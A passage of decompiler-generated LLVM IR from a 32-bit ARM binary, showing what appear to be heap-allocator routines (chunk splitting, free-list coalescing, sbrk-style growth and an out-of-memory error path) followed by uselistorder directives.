  store i32 %v3_105d0, i32* %r3.global-to-local, align 4
  %v1_105d4 = add i32 %v4_105c0, 884
  %v2_105d4 = inttoptr i32 %v1_105d4 to i32*
  %v3_105d4 = load i32, i32* %v2_105d4, align 4
  store i32 %v3_105d4, i32* %r2.global-to-local, align 4
  %v2_105d8 = add i32 %v3_105d0, %v2_105c8
  store i32 %v2_105d8, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_105c8, %v5_105c8
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_105b8
  store i32 %v2_105c8, i32* %v4_105c8, align 4
  %v0_105e0.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_105e0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_105b8, %bb165
  %v1_105e0 = phi i32 [ %v3_105d4, %dec_label_pc_105b8 ], [ %v1_105e0.pre, %bb165 ]
  %v4_105e4 = phi i32 [ %v2_105d8, %dec_label_pc_105b8 ], [ %v0_105e0.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_105e4, %v1_105e0
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_105e4 = load i32, i32* %lr.global-to-local, align 4
  %v6_105e4 = add i32 %v5_105e4, 884
  %v7_105e4 = inttoptr i32 %v6_105e4 to i32*
  store i32 %v4_105e4, i32* %v7_105e4, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_105e8 = load i32, i32* %lr.global-to-local, align 4
  %v1_105e8 = add i32 %v0_105e8, 44
  %v2_105e8 = inttoptr i32 %v1_105e8 to i32*
  %v3_105e8 = load i32, i32* %v2_105e8, align 4
  store i32 %v3_105e8, i32* %ip.global-to-local, align 4
  %v1_105ec = add i32 %v3_105e8, 4
  %v2_105ec = inttoptr i32 %v1_105ec to i32*
  %v3_105ec = load i32, i32* %v2_105ec, align 4
  store i32 %v1_10200, i32* %r1.global-to-local, align 4
  %v1_105f4 = and i32 %v3_105ec, -4
  store i32 %v1_105f4, i32* %r3.global-to-local, align 4
  %v3_105f8 = icmp ult i32 %v1_105f4, %v1_10200
  br i1 %v3_105f8, label %dec_label_pc_10624, label %dec_label_pc_10600

dec_label_pc_10600:                               ; preds = %bb168
  %v0_10600 = load i32, i32* @sl, align 4
  %v2_10600 = sub i32 %v1_105f4, %v0_10600
  %v2_10604 = add i32 %v0_10600, %v3_105e8
  store i32 %v2_10604, i32* %r1.global-to-local, align 4
  %v1_10608 = or i32 %v2_10600, 1
  store i32 %v1_10608, i32* %r3.global-to-local, align 4
  %v1_1060c = or i32 %v0_10600, 1
  store i32 %v1_1060c, i32* %r2.global-to-local, align 4
  %v1_10610 = add i32 %v3_105e8, 8
  store i32 %v1_10610, i32* %r0.global-to-local, align 4
  store i32 %v1_1060c, i32* %v2_105ec, align 4
  %v0_10618 = load i32, i32* %r1.global-to-local, align 4
  %v1_10618 = load i32, i32* %lr.global-to-local, align 4
  %v2_10618 = add i32 %v1_10618, 44
  %v3_10618 = inttoptr i32 %v2_10618 to i32*
  store i32 %v0_10618, i32* %v3_10618, align 4
  %v0_1061c = load i32, i32* %r3.global-to-local, align 4
  %v1_1061c = load i32, i32* %r1.global-to-local, align 4
  %v2_1061c = add i32 %v1_1061c, 4
  %v3_1061c = inttoptr i32 %v2_1061c to i32*
  store i32 %v0_1061c, i32* %v3_1061c, align 4
  br label %dec_label_pc_10634

dec_label_pc_10624:                               ; preds = %bb157, %bb168, %dec_label_pc_10400
  %v0_10624 = call i32 @function_ce08()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1062c = inttoptr i32 %v0_10624 to i32*
  store i32 12, i32* %v2_1062c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10634

dec_label_pc_10634:                               ; preds = %bb151, %bb150, %dec_label_pc_10600, %dec_label_pc_10248, %dec_label_pc_10624
  %v0_10634 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10634, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10638

dec_label_pc_10638:                               ; preds = %.thread1, %dec_label_pc_10214, %.thread121, %dec_label_pc_10084, %dec_label_pc_10078, %dec_label_pc_fee0, %dec_label_pc_fe64, %dec_label_pc_10634
  store i32 %v2_fd8c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 142044, i32* %r2.global-to-local, align 4
  %v4_10648 = load i32, i32* inttoptr (i32 142068 to i32*), align 4
  store i32 %v4_10648, i32* @ip, align 4
  store i32 67156, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_10648)
  br label %dec_label_pc_10654

dec_label_pc_10654:                               ; preds = %dec_label_pc_fdc4, %dec_label_pc_10638
  %v0_10654 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10654, i32* %r0.global-to-local, align 4
  store i32 %v3_fd60, i32* @r4, align 4
  store i32 %v6_fd60, i32* @r5, align 4
  store i32 %v9_fd60, i32* @r6, align 4
  store i32 %v12_fd60, i32* @r7, align 4
  store i32 %v15_fd60, i32* @r8, align 4
  store i32 %v18_fd60, i32* @sb, align 4
  store i32 %v21_fd60, i32* @sl, align 4
  store i32 %v24_fd60, i32* @fp, align 4
  store i32 %v27_fd60, i32* @lr, align 4
  ret i32 %v0_10654

; uselistorder directives
  uselistorder i32 %v0_10600, { 1, 0, 2 }
  uselistorder i32 %v3_105e8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_105e4, { 1, 0 }
  uselistorder i32 %v2_105c8, { 2, 0, 1, 3 }
  uselistorder i32 %v4_105c0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10578, { 1, 2, 0 }
  uselistorder i32 %v0_10540, { 1, 0 }
  uselistorder i32 %v0_10534, { 1, 0 }
  uselistorder i32 %v2_10524, { 1, 0 }
  uselistorder i32 %v2_104b4, { 2, 1, 0 }
  uselistorder i32 %v2_1049c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10494, { 1, 0, 2 }
  uselistorder i32 %v1_10490, { 2, 1, 0 }
  uselistorder i32 %v0_10490, { 3, 1, 2, 0 }
  uselistorder i32 %v1_10474, { 1, 0 }
  uselistorder i32 %v2_1044c, { 1, 0 }
  uselistorder i32 %v3_10440, { 1, 0, 2 }
  uselistorder i32 %v2_10420, { 1, 0, 2 }
  uselistorder i32* %v2_10418, { 1, 0, 2 }
  uselistorder i32 %v0_10400, { 1, 0 }
  uselistorder i32 %v6_103dc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_103c8, { 2, 1, 0 }
  uselistorder i32 %v0_103b0, { 1, 0 }
  uselistorder i32 %v2_1036c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10368, { 1, 0 }
  uselistorder i32 %v3_10340, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_10320, { 1, 0, 2 }
  uselistorder i32 %v2_10308, { 1, 2, 0, 3 }
  uselistorder i32 %v1_102b0, { 2, 1, 0 }
  uselistorder i32 %v6_102a4, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_10280, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10240, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10200, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_101f8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_101f4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_101e0, { 1, 0 }
  uselistorder i32 %v7_101a0, { 1, 0 }
  uselistorder i32 %v4_101a0, { 1, 0 }
  uselistorder i32 %v0_10170, { 1, 0 }
  uselistorder i32 %v2_10144, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1014054, { 1, 0 }
  uselistorder i32 %v1_1010c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_100f4., { 1, 2, 0 }
  uselistorder i32 %v0_100fc, { 0, 1, 3, 2 }
  uselistorder i32 %v1_100fc, { 1, 0 }
  uselistorder i32 %v3_100dc, { 1, 0 }
  uselistorder i32 %v4_100d8, { 1, 0, 2 }
  uselistorder i32 %v1_10048, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_100a0, { 1, 0 }
  uselistorder i32 %v1_10084, { 1, 0 }
  uselistorder i32 %v1_ff24, { 1, 0 }
  uselistorder i32 %v0_10064, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1002c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_100c0.pre, { 1, 2, 0 }
  uselistorder i32 %v0_10008, { 2, 1, 0 }
  uselistorder i32 %v3_fffc, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_ff1c, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_ffc4, { 1, 0 }
  uselistorder i32 %v3_ffb8, { 1, 0 }
  uselistorder i32 %v0_ffc4, { 1, 0 }
  uselistorder i32 %v3_ff9c, { 0, 2, 3, 1 }
  uselistorder i32 %v2_ff8c, { 1, 0, 2 }
  uselistorder i32 %v3_ff44, { 2, 1, 0 }
  uselistorder i32 %v0_ff34, { 3, 2, 1, 0 }
  uselistorder i32 %v0_ff04, { 1, 0 }
  uselistorder i32 %v1_feb8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_feb4, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_fe58, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_fe4c, { 1, 0 }
  uselistorder i32 %v3_fe1c, { 1, 0 }
  uselistorder i32 %v0_fe10, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_fdf0, { 0, 2, 1, 3 }
  uselistorder i1 %v7_fde4, { 1, 0 }
  uselistorder i32 %v0_fdbc, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 39, 40, 41, 43, 44, 45, 46, 66, 67, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59, 61, 62, 63, 64, 65, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 0, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 31, 3, 4, 5, 6, 21, 10, 7, 22, 8, 9, 12, 11, 17, 13, 23, 16, 14, 24, 18, 28, 26, 25, 27, 20, 29, 32, 30, 58, 33, 34, 59, 35, 36, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 19, 50, 51, 52, 53, 15, 54, 57, 56, 55, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 11, 9, 12, 13, 14, 15, 16, 17, 18, 19, 20, 40, 21, 22, 33, 32, 41, 23, 42, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_12214, { 1, 0 }
  uselistorder i32 (i32)* @function_fce8, { 1, 0 }
  uselistorder label %dec_label_pc_10654, { 1, 0 }
  uselistorder label %dec_label_pc_10638, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_10634, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10624, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_105b8, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10534, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1052c, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10400, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_10334, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_101ec, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_10140, { 1, 0 }
  uselistorder label %dec_label_pc_10148.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1010c, { 1, 0 }
  uselistorder label %dec_label_pc_100c0, { 1, 0 }
  uselistorder label %dec_label_pc_10054, { 1, 0 }
  uselistorder label %dec_label_pc_10050, { 1, 0 }
  uselistorder label %dec_label_pc_fffc, { 1, 0 }
  uselistorder label %dec_label_pc_ffe8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ffb0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_ff9c, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_10668(i32 %arg1) local_unnamed_addr {
dec_label_pc_10668:
  %v0_10668 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10668, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_10668
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_10668, %bb
  %v10_1067c = phi i32 [ %arg1, %dec_label_pc_10668 ], [ 0, %bb ]
  ret i32 %v10_1067c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_10680(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10680:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_10680 = add i32 %arg2, 44
  %v2_10680 = inttoptr i32 %v1_10680 to i32*
  %v3_10680 = load i32, i32* %v2_10680, align 4
  %v1_10688 = add i32 %v3_10680, 4
  %v2_10688 = inttoptr i32 %v1_10688 to i32*
  %v3_10688 = load i32, i32* %v2_10688, align 4
  %v1_1068c = add i32 %arg2, 860
  %v2_1068c = inttoptr i32 %v1_1068c to i32*
  %v3_1068c = load i32, i32* %v2_1068c, align 4
  store i32 %v3_1068c, i32* @r4, align 4
  %v1_10690 = and i32 %v3_10688, -4
  store i32 %v1_10690, i32* @r6, align 4
  %v1_10694 = add i32 %v1_10690, -17
  %v2_10698 = add i32 %v1_10694, %v3_1068c
  store i32 %arg2, i32* @r5, align 4
  %v2_106a4 = sub i32 %v2_10698, %arg1
  store i32 %v2_106a4, i32* @r0, align 4
  store i32 %v3_1068c, i32* @r1, align 4
  %v0_106ac = call i32 @function_c960()
  %v1_106b0 = add i32 %v0_106ac, -1
  store i32 %v1_106b0, i32* %r0.global-to-local, align 4
  %v0_106b4 = load i32, i32* @r4, align 4
  %v2_106b4 = mul i32 %v0_106b4, %v1_106b0
  store i32 %v2_106b4, i32* %r7.global-to-local, align 4
  %v2_106b8 = icmp eq i32 %v2_106b4, 0
  store i1 %v2_106b8, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_106b4, 1
  br i1 %tmp8, label %dec_label_pc_10720, label %dec_label_pc_106c0

dec_label_pc_106c0:                               ; preds = %dec_label_pc_10680
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_106c4 = call i32 @function_12528(i32 0)
  store i32 %v1_106c4, i32* %r0.global-to-local, align 4
  %v0_106c8 = load i32, i32* @r5, align 4
  %v1_106c8 = add i32 %v0_106c8, 44
  %v2_106c8 = inttoptr i32 %v1_106c8 to i32*
  %v3_106c8 = load i32, i32* %v2_106c8, align 4
  %v0_106cc = load i32, i32* @r6, align 4
  %v2_106cc = add i32 %v0_106cc, %v3_106c8
  %v9_106d0 = icmp eq i32 %v1_106c4, %v2_106cc
  store i1 %v9_106d0, i1* @cpsr_z, align 1
  store i32 %v1_106c4, i32* @r4, align 4
  br i1 %v9_106d0, label %dec_label_pc_106dc, label %dec_label_pc_10720

dec_label_pc_106dc:                               ; preds = %dec_label_pc_106c0
  %v0_106dc = load i32, i32* %r7.global-to-local, align 4
  %v1_106dc = sub i32 0, %v0_106dc
  store i32 %v1_106dc, i32* %r0.global-to-local, align 4
  %v1_106e0 = call i32 @function_12528(i32 %v1_106dc)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_106e8 = call i32 @function_12528(i32 0)
  store i32 %v1_106e8, i32* %r0.global-to-local, align 4
  %v7_106ec = icmp eq i32 %v1_106e8, -1
  store i1 %v7_106ec, i1* @cpsr_z, align 1
  br i1 %v7_106ec, label %dec_label_pc_10720, label %dec_label_pc_106f4

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106dc
  %v0_106f4 = load i32, i32* @r4, align 4
  %v2_106f4 = sub i32 %v0_106f4, %v1_106e8
  store i32 %v2_106f4, i32* %r0.global-to-local, align 4
  %v9_106f4 = icmp eq i32 %v0_106f4, %v1_106e8
  store i1 %v9_106f4, i1* @cpsr_z, align 1
  br i1 %v9_106f4, label %dec_label_pc_10720, label %dec_label_pc_106fc

dec_label_pc_106fc:                               ; preds = %dec_label_pc_106f4
  %v0_106fc = load i32, i32* @r5, align 4
  %v1_106fc = add i32 %v0_106fc, 872
  %v2_106fc = inttoptr i32 %v1_106fc to i32*
  %v3_106fc = load i32, i32* %v2_106fc, align 4
  %v1_10700 = load i32, i32* @r6, align 4
  %v2_10700 = sub i32 %v1_10700, %v2_106f4
  store i32 %v2_10700, i32* %r2.global-to-local, align 4
  %v1_10704 = add i32 %v0_106fc, 44
  %v2_10704 = inttoptr i32 %v1_10704 to i32*
  %v3_10704 = load i32, i32* %v2_10704, align 4
  store i32 %v3_10704, i32* %r1.global-to-local, align 4
  %v2_10708 = sub i32 %v3_106fc, %v2_106f4
  %v1_1070c = or i32 %v2_10700, 1
  store i32 %v1_1070c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10708, i32* %v2_106fc, align 4
  %v0_10718 = load i32, i32* %r2.global-to-local, align 4
  %v1_10718 = load i32, i32* %r1.global-to-local, align 4
  %v2_10718 = add i32 %v1_10718, 4
  %v3_10718 = inttoptr i32 %v2_10718 to i32*
  store i32 %v0_10718, i32* %v3_10718, align 4
  %v1_1072c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10724

dec_label_pc_10720:                               ; preds = %dec_label_pc_106c0, %dec_label_pc_106f4, %dec_label_pc_106dc, %dec_label_pc_10680
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10724

dec_label_pc_10724:                               ; preds = %dec_label_pc_106fc, %dec_label_pc_10720
  %v1_1072c = phi i32 [ %v1_1072c.pre, %dec_label_pc_106fc ], [ 0, %dec_label_pc_10720 ]
  ret i32 %v1_1072c

; uselistorder directives
  uselistorder i1 %v7_106ec, { 1, 0 }
  uselistorder i32 %v1_106e8, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 (i32)* @function_12528, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10724, { 1, 0 }
  uselistorder label %dec_label_pc_10720, { 1, 2, 0, 3 }
}

define i32 @function_10730() local_unnamed_addr {
dec_label_pc_10730:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10730 = load i32, i32* @r4, align 4
  store i32 %v3_10730, i32* %stack_var_-36, align 4
  %v0_10734 = load i32, i32* @r0, align 4
  %v1_10734 = inttoptr i32 %v0_10734 to i32*
  %v2_10734 = load i32, i32* %v1_10734, align 4
  store i32 %v2_10734, i32* %r3.global-to-local, align 4
  %v2_10738 = icmp eq i32 %v2_10734, 0
  store i32 %v0_10734, i32* @r4, align 4
  br i1 %v2_10738, label %dec_label_pc_10870.preheader, label %dec_label_pc_1074c

dec_label_pc_10870.preheader:                     ; preds = %dec_label_pc_10730
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1087825 = add i32 %v0_10734, 52
  store i32 %v1_1087825, i32* %r3.global-to-local, align 4
  %v2_1088026 = add i32 %v0_10734, 60
  %v3_1088027 = inttoptr i32 %v2_1088026 to i32*
  store i32 %v1_1087825, i32* %v3_1088027, align 4
  %v0_1088428 = load i32, i32* %r3.global-to-local, align 4
  %v2_1088429 = add i32 %v0_1088428, 12
  %v3_1088430 = inttoptr i32 %v2_1088429 to i32*
  store i32 %v0_1088428, i32* %v3_1088430, align 4
  br label %dec_label_pc_10870.dec_label_pc_10870_crit_edge

dec_label_pc_1074c:                               ; preds = %dec_label_pc_10730
  %v1_1074c = and i32 %v2_10734, -3
  %v3_10750 = udiv i32 %v2_10734, 8
  store i32 %v3_10750, i32* %r2.global-to-local, align 4
  store i32 %v1_1074c, i32* %v1_10734, align 4
  %v0_10758 = load i32, i32* @r0, align 4
  %v1_10758 = add i32 %v0_10758, -4
  store i32 %v1_10758, i32* %r3.global-to-local, align 4
  %v1_1075c = load i32, i32* %r2.global-to-local, align 4
  %v4_1075c = mul i32 %v1_1075c, 4
  %v5_1075c = add i32 %v4_1075c, %v1_10758
  store i32 %v5_1075c, i32* %sb.global-to-local, align 4
  %v1_10760 = add i32 %v0_10758, 52
  store i32 %v1_10760, i32* %r7.global-to-local, align 4
  %v1_10764 = add i32 %v0_10758, 4
  store i32 %v1_10764, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1076c

dec_label_pc_1076c:                               ; preds = %dec_label_pc_10868, %dec_label_pc_1074c
  %v1_1086010 = phi i32 [ %v1_10860, %dec_label_pc_10868 ], [ %v5_1075c, %dec_label_pc_1074c ]
  %v1_10778 = phi i32 [ %v1_10868, %dec_label_pc_10868 ], [ %v1_10764, %dec_label_pc_1074c ]
  %v1_1076c = inttoptr i32 %v1_10778 to i32*
  %v2_1076c = load i32, i32* %v1_1076c, align 4
  store i32 %v2_1076c, i32* %r1.global-to-local, align 4
  %v2_10770 = icmp eq i32 %v2_1076c, 0
  br i1 %v2_10770, label %dec_label_pc_10860, label %dec_label_pc_10778

dec_label_pc_10778:                               ; preds = %dec_label_pc_1076c
  %v0_10778 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_10778, i32* %v1_1076c, align 4
  %v0_1077c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1077c

dec_label_pc_1077c:                               ; preds = %dec_label_pc_10854, %dec_label_pc_10778
  %v0_10798 = phi i32 [ %v0_10854, %dec_label_pc_10854 ], [ %v0_1077c.pre, %dec_label_pc_10778 ]
  %v1_1077c = add i32 %v0_10798, 4
  %v2_1077c = inttoptr i32 %v1_1077c to i32*
  %v3_1077c = load i32, i32* %v2_1077c, align 4
  store i32 %v3_1077c, i32* %r3.global-to-local, align 4
  %v1_10780 = and i32 %v3_1077c, -2
  store i32 %v1_10780, i32* %lr.global-to-local, align 4
  %v2_10784 = add i32 %v1_10780, %v0_10798
  store i32 %v2_10784, i32* @r0, align 4
  %v1_10788 = urem i32 %v3_1077c, 2
  %v2_10788 = icmp eq i32 %v1_10788, 0
  %v1_1078c = add i32 %v0_10798, 8
  %v2_1078c = inttoptr i32 %v1_1078c to i32*
  %v3_1078c = load i32, i32* %v2_1078c, align 4
  store i32 %v3_1078c, i32* %sl.global-to-local, align 4
  %v1_10790 = add i32 %v2_10784, 4
  %v2_10790 = inttoptr i32 %v1_10790 to i32*
  %v3_10790 = load i32, i32* %v2_10790, align 4
  store i32 %v3_10790, i32* %r8.global-to-local, align 4
  br i1 %v2_10788, label %dec_label_pc_10798, label %dec_label_pc_107cc

dec_label_pc_10798:                               ; preds = %dec_label_pc_1077c
  %v1_10798 = inttoptr i32 %v0_10798 to i32*
  %v2_10798 = load i32, i32* %v1_10798, align 4
  store i32 %v2_10798, i32* %r5.global-to-local, align 4
  %v2_1079c = sub i32 %v0_10798, %v2_10798
  store i32 %v2_1079c, i32* %r3.global-to-local, align 4
  %v1_107a0 = add i32 %v2_1079c, 8
  %v2_107a0 = inttoptr i32 %v1_107a0 to i32*
  %v3_107a0 = load i32, i32* %v2_107a0, align 4
  store i32 %v3_107a0, i32* %ip.global-to-local, align 4
  %v1_107a4 = add i32 %v3_107a0, 12
  %v2_107a4 = inttoptr i32 %v1_107a4 to i32*
  %v3_107a4 = load i32, i32* %v2_107a4, align 4
  store i32 %v3_107a4, i32* %r1.global-to-local, align 4
  %v9_107a8 = icmp eq i32 %v3_107a4, %v2_1079c
  %v1_107ac = add i32 %v2_1079c, 12
  %v2_107ac = inttoptr i32 %v1_107ac to i32*
  %v3_107ac = load i32, i32* %v2_107ac, align 4
  store i32 %v3_107ac, i32* %r2.global-to-local, align 4
  br i1 %v9_107a8, label %dec_label_pc_107b4, label %dec_label_pc_10810

dec_label_pc_107b4:                               ; preds = %dec_label_pc_10798
  %v1_107b4 = add i32 %v3_107ac, 8
  %v2_107b4 = inttoptr i32 %v1_107b4 to i32*
  %v3_107b4 = load i32, i32* %v2_107b4, align 4
  store i32 %v3_107b4, i32* %r3.global-to-local, align 4
  %v9_107b8 = icmp eq i32 %v3_107b4, %v2_1079c
  br i1 %v9_107b8, label %dec_label_pc_107c0, label %dec_label_pc_10810

dec_label_pc_107c0:                               ; preds = %dec_label_pc_107b4
  store i32 %v3_107a0, i32* %v2_107b4, align 4
  %v0_107c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_107c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_107c4 = add i32 %v1_107c4, 12
  %v3_107c4 = inttoptr i32 %v2_107c4 to i32*
  store i32 %v0_107c4, i32* %v3_107c4, align 4
  %v0_107c8 = load i32, i32* %lr.global-to-local, align 4
  %v1_107c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_107c8 = add i32 %v1_107c8, %v0_107c8
  store i32 %v2_107c8, i32* %lr.global-to-local, align 4
  %v0_107d0.pre = load i32, i32* @r0, align 4
  %v0_107d4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_107cc

dec_label_pc_107cc:                               ; preds = %dec_label_pc_1077c, %dec_label_pc_107c0
  %v0_10844 = phi i32 [ %v1_10780, %dec_label_pc_1077c ], [ %v2_107c8, %dec_label_pc_107c0 ]
  %v0_107d4 = phi i32 [ %v3_10790, %dec_label_pc_1077c ], [ %v0_107d4.pre, %dec_label_pc_107c0 ]
  %v1_107e8 = phi i32 [ %v2_10784, %dec_label_pc_1077c ], [ %v0_107d0.pre, %dec_label_pc_107c0 ]
  %v0_107cc = load i32, i32* @r4, align 4
  %v1_107cc = add i32 %v0_107cc, 44
  %v2_107cc = inttoptr i32 %v1_107cc to i32*
  %v3_107cc = load i32, i32* %v2_107cc, align 4
  store i32 %v3_107cc, i32* %r3.global-to-local, align 4
  %v9_107d0 = icmp eq i32 %v1_107e8, %v3_107cc
  %v1_107d4 = and i32 %v0_107d4, -4
  store i32 %v1_107d4, i32* %r5.global-to-local, align 4
  br i1 %v9_107d0, label %dec_label_pc_10844, label %dec_label_pc_107dc

dec_label_pc_107dc:                               ; preds = %dec_label_pc_107cc
  %v2_107dc = add i32 %v1_107e8, %v1_107d4
  store i32 %v2_107dc, i32* %r3.global-to-local, align 4
  %v1_107e0 = add i32 %v2_107dc, 4
  %v2_107e0 = inttoptr i32 %v1_107e0 to i32*
  %v3_107e0 = load i32, i32* %v2_107e0, align 4
